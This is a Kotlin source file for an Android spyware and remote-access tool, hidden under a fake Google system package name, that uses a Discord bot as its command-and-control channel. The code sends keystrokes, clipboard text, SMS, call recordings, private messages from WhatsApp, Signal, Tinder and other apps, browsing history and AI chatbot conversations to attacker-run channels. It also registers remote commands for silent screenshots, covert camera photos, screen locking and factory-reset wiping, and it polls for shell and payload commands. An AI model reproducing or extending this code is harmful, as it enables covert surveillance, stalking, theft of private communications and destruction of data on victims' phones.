package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * DiscordC2Engine
 *
 * Standalone, independent C2 Admin Portal Engine managing Discord WebSocket Gateway,
 * HTTP REST channel polling, 29-channel matrix, Slash Command registration,
 * and Categorized Media/Text stream dispatch.
 */
class DiscordC2Engine(
    private val context: Context,
    private val botToken: String,
    private val guildId: String,
    private val httpClient: OkHttpClient,
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "DiscordC2Engine"
        @Volatile var activeInstance: DiscordC2Engine? = null

        fun sendDiscordStreamNotification(appName: String, title: String = "", text: String = "") {
            activeInstance?.sendDiscordCategorizedMessage(
                "04-notifications",
                "🔔 **Notification [$appName]**\n• **Title**: $title\n• **Text**: $text"
            )
        }

        fun sendDiscordStreamKeylog(appName: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "05-keylogs-and-clipboard",
                "⌨️ **Keylog [$appName]**\n```\n$text\n```"
            )
        }

        fun sendDiscordStreamClipboard(clipData: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "05-keylogs-and-clipboard",
                "📋 **Clipboard Copied Text**\n```\n$clipData\n```"
            )
        }

        fun sendDiscordStreamSms(sender: String, body: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "06-sms-and-contacts",
                "💬 **SMS Received [$sender]**\n$body"
            )
        }

        fun sendDiscordStreamCallRecord(file: File) {
            activeInstance?.sendDiscordCategorizedFile(
                "09-call-logs-and-recs",
                file,
                "audio/mp4"
            )
        }

        fun sendDiscordStreamSensorAlert(sensorName: String, details: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "17-alerts-and-sensors",
                "🚨 **Sensor Telemetry Alert [$sensorName]**\n• $details"
            )
        }

        fun sendDiscordStreamAIChatbot(appName: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "22-ai-chatbot-streams",
                "🧠 **AI Chatbot Stream [$appName]**\n```\n$text\n```"
            )
        }

        fun sendDiscordStreamLiveTyping(appName: String, text: String) {
            activeInstance?.sendDiscordCategorizedMessage(
                "05-keylogs-and-clipboard",
                "⌨️ **Live Typing [$appName]**\n```\n$text\n```"
            )
        }

        fun getMessagingChannelForPackage(pkg: String): String? {
            return when {
                pkg.contains("whatsapp") -> "10-whatsapp-chat"
                pkg.contains("facebook") || pkg.contains("orca") -> "11-facebook-messages"
                pkg.contains("instagram") -> "12-instagram-chat"
                pkg.contains("snapchat") -> "13-snapchat-chat"
                pkg.contains("tinder") -> "14-tinder-chat"
                pkg.contains("tiktok") -> "15-tiktok-chat"
                pkg.contains("telegram") -> "23-telegram-stream"
                pkg.contains("viber") -> "24-viber-chat"
                pkg.contains("discord") -> "25-discord-chat"
                pkg.contains("line") -> "26-line-chat"
                pkg.contains("kik") -> "27-kik-chat"
                pkg.contains("securesms") || pkg.contains("signal") -> "28-signal-chat"
                else -> null
            }
        }

        fun sendDiscordStreamMessagingApp(
            channelName: String = "",
            appName: String = "",
            sender: String = "",
            contact: String = "",
            text: String = "",
            messageText: String = "",
            isOutgoing: Boolean = false
        ) {
            val resolvedContact = if (contact.isNotBlank()) contact else sender
            val resolvedText = if (messageText.isNotBlank()) messageText else text
            val chan = if (channelName.isNotBlank()) channelName else getMessagingChannelForPackage(appName) ?: "06-sms-and-contacts"
            val dir = if (isOutgoing) "OUTBOUND ➡️" else "INBOUND ⬅️"
            activeInstance?.sendDiscordCategorizedMessage(
                chan,
                "💬 **Social Message [$appName]** ($dir)\n• **Contact**: $resolvedContact\n• **Text**: $resolvedText"
            )
        }

        fun sendDiscordStreamBrowserUrl(
            appName: String = "",
            url: String = "",
            fullUrl: String = "",
            urlText: String = "",
            title: String = "",
            pageTitle: String = ""
        ) {
            val resolvedUrl = if (url.isNotBlank()) url else if (fullUrl.isNotBlank()) fullUrl else urlText
            val resolvedTitle = if (title.isNotBlank()) title else pageTitle
            activeInstance?.sendDiscordCategorizedMessage(
                "18-browser-history",
                "🌐 **Browser URL [$appName]**\n• **Title**: $resolvedTitle\n• **URL**: $resolvedUrl"
            )
        }

        fun sendDiscordStreamBrowserSearch(
            appName: String = "",
            searchEngine: String = "Google",
            query: String = "",
            fullUrl: String = ""
        ) {
            activeInstance?.sendDiscordCategorizedMessage(
                "18-browser-history",
                "🔍 **Web Search [$appName]** ($searchEngine)\n• **Query**: $query"
            )
        }

        fun sendDiscordStreamYouTubeWatch(
            appName: String = "",
            videoTitle: String = "",
            channelName: String = "",
            videoUrl: String = ""
        ) {
            activeInstance?.sendDiscordCategorizedMessage(
                "19-youtube-stream",
                "📺 **YouTube Video Watch [$appName]**\n• **Title**: $videoTitle\n• **Channel**: $channelName\n• **URL**: $videoUrl"
            )
        }

        fun sendDiscordStreamYouTubeSearch(appName: String = "", searchQuery: String = "") {
            activeInstance?.sendDiscordCategorizedMessage(
                "19-youtube-stream",
                "🔍 **YouTube Search Query [$appName]**\n• **Query**: $searchQuery"
            )
        }
    }

    fun startEngine() {
        activeInstance = this
        if (botToken.isBlank() || guildId.isBlank()) return
        Log.i(TAG, "Starting Standalone Discord C2 Admin Portal Engine (! Prefix Command Mode)...")
        registerDiscordSlashCommands()
        startDiscordPollingLoop()
    }

    fun sendDiscordCategorizedMessage(channelName: String, contentText: String) {
        if (botToken.isBlank() || guildId.isBlank() || contentText.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val channelId = getOrCreateDiscordChannelId(channelName) ?: return@launch
                val url = "https://discord.com/api/v10/channels/$channelId/messages"

                val chunks = chunkMessageText(contentText, maxChunkSize = 1850)
                for ((idx, chunk) in chunks.withIndex()) {
                    val finalContent = if (chunks.size > 1) "*(Part ${idx + 1}/${chunks.size})*\n$chunk" else chunk
                    val json = JSONObject().put("content", finalContent)
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val request = Request.Builder()
                        .url(url)
                        .addHeader("Authorization", "Bot $botToken")
                        .post(body)
                        .build()

                    httpClient.newCall(request).execute().close()
                    if (chunks.size > 1) {
                        delay(300L)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendDiscordCategorizedMessage error: ${e.message}")
            }
        }
    }

    fun sendDiscordCategorizedFile(channelName: String, file: File, contentType: String = "application/octet-stream") {
        if (botToken.isBlank() || guildId.isBlank() || !file.exists()) return
        scope.launch(Dispatchers.IO) {
            try {
                val channelId = getOrCreateDiscordChannelId(channelName) ?: return@launch
                val url = "https://discord.com/api/v10/channels/$channelId/messages"
                val fileBody = file.asRequestBody(contentType.toMediaTypeOrNull())
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.name, fileBody)
                    .build()
                val request = Request.Builder()
                    .url(url)
                    .addHeader("Authorization", "Bot $botToken")
                    .post(body)
                    .build()
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "sendDiscordCategorizedFile error: ${e.message}")
            }
        }
    }

    private fun getOrCreateDiscordChannelId(channelName: String): String? {
        val prefs = SecurityVaultManager.getEncryptedDiscordPrefs(context)
        val savedId = prefs.getString("chan_$channelName", null)
        if (!savedId.isNullOrBlank()) return savedId

        try {
            val url = "https://discord.com/api/v10/guilds/$guildId/channels"
            val req = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").get().build()
            httpClient.newCall(req).execute().use { res ->
                if (res.isSuccessful) {
                    val arr = JSONArray(res.body?.string() ?: "[]")
                    for (i in 0 until arr.length()) {
                        val obj = arr.getJSONObject(i)
                        if (obj.optString("name") == channelName) {
                            val id = obj.getString("id")
                            prefs.edit().putString("chan_$channelName", id).apply()
                            return id
                        }
                    }
                }
            }

            val json = JSONObject().apply {
                put("name", channelName)
                put("type", 0) // GUILD_TEXT
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val createReq = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").post(body).build()
            httpClient.newCall(createReq).execute().use { res ->
                if (res.isSuccessful) {
                    val obj = JSONObject(res.body?.string() ?: "{}")
                    val newId = if (obj.has("id")) obj.getString("id") else null
                    if (!newId.isNullOrBlank()) {
                        prefs.edit().putString("chan_$channelName", newId).apply()
                        return newId
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getOrCreateDiscordChannelId error: ${e.message}")
        }
        return null
    }

    private fun registerDiscordSlashCommands() {
        scope.launch(Dispatchers.IO) {
            try {
                val appId = getDiscordAppId() ?: return@launch
                val commandsList = JSONArray().apply {
                    put(JSONObject().put("name", "help").put("description", "Interactive Command Grid & Menu"))
                    put(JSONObject().put("name", "status").put("description", "Check device status"))
                    put(JSONObject().put("name", "deviceinfo").put("description", "Hardware & Battery Telemetry"))
                    put(JSONObject().put("name", "camera").put("description", "Take Rear Camera Photo"))
                    put(JSONObject().put("name", "frontcam").put("description", "Take Front Camera Photo"))
                    put(JSONObject().put("name", "screenshot").put("description", "Immediate Silent Screenshot"))
                    put(JSONObject().put("name", "lock").put("description", "Remotely Lock Device Screen"))
                    put(JSONObject().put("name", "wipe").put("description", "Remotely Factory Reset Device"))
                }

                val url = "https://discord.com/api/v10/applications/$appId/commands"
                val body = commandsList.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url(url)
                    .addHeader("Authorization", "Bot $botToken")
                    .put(body)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    Log.i(TAG, "Registered ${commandsList.length()} Discord Global Slash Commands: ${response.isSuccessful}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "registerDiscordSlashCommands error: ${e.message}")
            }
        }
    }

    private fun getDiscordAppId(): String? {
        try {
            val url = "https://discord.com/api/v10/users/@me"
            val req = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").get().build()
            httpClient.newCall(req).execute().use { res ->
                if (res.isSuccessful) {
                    val obj = JSONObject(res.body?.string() ?: "{}")
                    return if (obj.has("id")) obj.getString("id") else null
                }
            }
        } catch (_: Exception) {}
        return null
    }

    private fun chunkMessageText(text: String, maxChunkSize: Int = 1850): List<String> {
        if (text.length <= maxChunkSize) return listOf(text)
        val chunks = mutableListOf<String>()
        var start = 0
        while (start < text.length) {
            var end = (start + maxChunkSize).coerceAtMost(text.length)
            if (end < text.length) {
                val lastBreak = text.lastIndexOf('\n', end)
                if (lastBreak > start + 200) {
                    end = lastBreak + 1
                } else {
                    val lastSpace = text.lastIndexOf(' ', end)
                    if (lastSpace > start + 200) {
                        end = lastSpace + 1
                    }
                }
            }
            val chunk = text.substring(start, end).trim()
            if (chunk.isNotBlank()) {
                chunks.add(chunk)
            }
            start = end
        }
        return if (chunks.isNotEmpty()) chunks else listOf(text)
    }

    private fun startDiscordPollingLoop() {
        scope.launch(Dispatchers.IO) {
            Log.i(TAG, "Discord HTTP REST Polling Loop Active (! Prefix Engine) 🚀")
            var lastProcessedMsgId = ""
            while (true) {
                try {
                    val prefs = SecurityVaultManager.getEncryptedDiscordPrefs(context)
                    val commandsChanId = prefs.getString("chan_01-master-commands", null) ?: prefs.getString("chan_01-status-and-commands", null)
                    val termuxChanId = prefs.getString("chan_16-termux-shell", null)
                    val duckyChanId = prefs.getString("chan_29-ducky-script-payloads", null)
                    val photosChanId = prefs.getString("chan_08-photos-dump", null) ?: prefs.getString("chan_07-photos-and-screenshots", null)

                    val targetChannels = listOfNotNull(commandsChanId, termuxChanId, duckyChanId, photosChanId)
                    for (channelId in targetChannels) {
                        val url = "https://discord.com/api/v10/channels/$channelId/messages?limit=5"
                        val req = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").get().build()
                        httpClient.newCall(req).execute().use { res ->
                            if (res.isSuccessful) {
                                val array = JSONArray(res.body?.string() ?: "[]")
                                if (array.length() > 0) {
                                    val latest = array.getJSONObject(0)
                                    val msgId = latest.getString("id")
                                    val isBot = latest.optJSONObject("author")?.optBoolean("bot") ?: false
                                    val rawContent = latest.optString("content").trim()

                                    if (!isBot && msgId != lastProcessedMsgId && rawContent.isNotBlank()) {
                                        if (lastProcessedMsgId.isBlank()) {
                                            lastProcessedMsgId = msgId
                                        } else {
                                            lastProcessedMsgId = msgId
                                            Log.i(TAG, "Discord REST Poll received command in $channelId: '$rawContent'")
                                            val normalizedContent = if (rawContent.startsWith("/")) "!" + rawContent.substring(1) else rawContent
                                            val parsedIntent = OnDeviceAIC2Engine.parseNaturalLanguageCommand(normalizedContent)
                                            val dispatchText = if (parsedIntent.extractedParameters.isNotBlank()) {
                                                "${parsedIntent.targetCommand} ${parsedIntent.extractedParameters}".trim()
                                            } else {
                                                parsedIntent.targetCommand
                                            }
                                            commandDispatcher(channelId, dispatchText)
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "startDiscordPollingLoop error: ${e.message}")
                }
                delay(4000L)
            }
        }
    }
}
